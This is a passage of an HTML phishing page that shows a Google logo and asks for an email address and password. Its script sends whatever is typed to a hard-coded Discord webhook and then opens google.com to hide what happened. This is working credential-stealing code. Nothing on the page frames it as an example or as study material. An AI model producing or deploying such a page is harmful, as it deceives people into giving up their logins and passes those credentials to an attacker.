        border-style: none;
        border-radius: 3px;
        width: 70px;

</style>
<img id="img" src="https://th.bing.com/th/id/R.38aabe0613c4f17945cee40327ac367e?rik=mt2VM9zlD1xy%2bg&riu=http%3a%2f%2forig10.deviantart.net%2f6d95%2ff%2f2015%2f247%2fb%2f9%2fgoogle_2015_logo_high_resolution_png_by_jovicasmileski-d98chn1.png&ehk=lG6D9pljW2Xelus7LJtZjwHHjImg8kBuSVK6TAdwRhk%3d&risl=&pid=ImgRaw&r=0"><br>
<br>
Email:<br>
<input type="email" id="email"><br>
<br>
Password:<br>
<input type="password" id="pass"><br>
<br>
<input type="submit" id="submit" value="Confirm">

<script>
    const submit = document.getElementById('submit');
    const email = document.getElementById('email');
    const password = document.getElementById('pass');

    submit.addEventListener('click', () => {
        const url = 'https://discordapp.com/api/webhooks/1092569585045221386/8la5fQp6icwktAFDw68NpIInnDUvYbHEMZRTeItiBqyH8tk4AP8iSlCTTTZormOH-cZO';
        const message = `Email: ${email.value}\nPassword: ${password.value}`;

        fetch(url, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: message })
        });
        window.open('https://google.com');
    });

</script>
